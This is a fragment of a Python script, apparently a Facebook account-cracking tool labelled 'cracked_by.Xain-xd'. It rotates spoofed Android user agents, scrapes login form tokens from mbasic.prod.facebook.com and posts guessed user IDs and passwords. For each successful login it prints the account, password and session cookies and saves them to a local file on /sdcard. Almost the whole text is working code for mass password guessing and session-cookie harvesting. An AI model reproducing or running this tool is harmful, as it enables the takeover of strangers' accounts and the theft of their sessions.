ZTE Blade L220 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/371.0.0.10.104;]","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/373.1.0.8.104;]","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; ZTE Blade L220 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]","Mozilla/5.0 (Linux; Android 10; Z30 pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 10; Primo HM6 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/bn_IN;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 13; Nokia C32 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 11; AE9950 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/bn_IN;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 10; itel A14 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/363.0.0.6.63;]","Mozilla/5.0 (Linux; Android 12; itel S663L Build/SP1A.210812.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/374.0.0.10.114;]","Mozilla/5.0 (Linux; Android 12; itel S663L Build/SP1A.210812.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/375.0.0.7.111;]","Mozilla/5.0 (Linux; Android 10; Symphony Atom ii Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 11; F10XIPSQ Build/0929; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 12; Sparx Neo 7 Pro Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/368.0.0.5.95;]","Mozilla/5.0 (Linux; Android 8.1.0; C11_Pro Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 8.1.0; itel W6001 Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/370.0.0.16.116;]","Mozilla/5.0 (Linux; Android 8.1.0; BUZZ 1 Plus Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/367.0.0.7.52;]","Mozilla/5.0 (Linux; Android 9; LH9920 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/ta_IN;FBAV/376.0.0.7.103;]","Mozilla/5.0 (Linux; Android 9.0; X109 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/376.0.0.7.103;]"])
            session.headers.update({"Host": "m.facebook.com","upgrade-insecure-requests":"1","user-agent":f"{uai}","accept":"*/*","dnt":"1","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":f"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-US,en;q=0.9"})
            get_method = session.get(f"https://mbasic.prod.facebook.com/").text
            date = {'lsd': re.search('name="lsd" value="(.*?)"',str(get_method)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(get_method)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(get_method)).group(1), 'li': re.search('name="li" value="(.*?)"',str(get_method)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': uid, 'pass': ps, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(get_method)).group(1)}
            head = ({"Host": "m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com/","content-type":"application/x-www-form-urlencoded","user-agent":f"{uai2}","accept":"*/*","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"?1","sec-fetch-dest":"empty","referer":f"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-US,en;q=0.9"})
            post_method = session.post(f"https://mbasic.prod.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=date, headers=head)
            if "c_user" in session.cookies.get_dict():
                kukis=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xx=kukis.split("c_user=")[1]
                uid=xx[:15].replace(";","  ")
              #  ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                #res = requests.get(ckk).text
               # if 'Photoshop' in res:
                oks.append(uid)
                print(f"\r\r[b]"+xain_co(oks)+f" [bright_green]{uid} [orange3]▶ [bright_green]{ps}               \n{animi(oks)}sb=cracked_by.Xain-xd:tool;"+kukis.replace("-1","1")+"\n")
                open("/sdcard/XAIN XD/XAIN-OK.txt","a").write(uid+"|"+ps+"|"+kukis+"\n")
                break            
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1    

menu()